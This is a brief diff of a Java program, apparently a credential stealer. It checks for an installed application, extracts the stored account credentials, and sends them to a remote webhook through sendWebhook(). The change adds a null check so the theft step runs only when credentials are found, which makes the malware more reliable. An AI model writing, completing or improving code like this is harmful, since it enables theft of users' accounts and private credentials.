@@ -37,6 +37,9 @@ public class main {
         if (new File(APP_PATH).exists()) {
             main extractor = new main();
             String[] credentials = extractor.extractAccount();
+            if (credentials==null)
+                return;
+            
             sendWebhook(credentials[0], credentials[1]);
         } else {
             System.out.println("Application not found: " + APP_PATH);
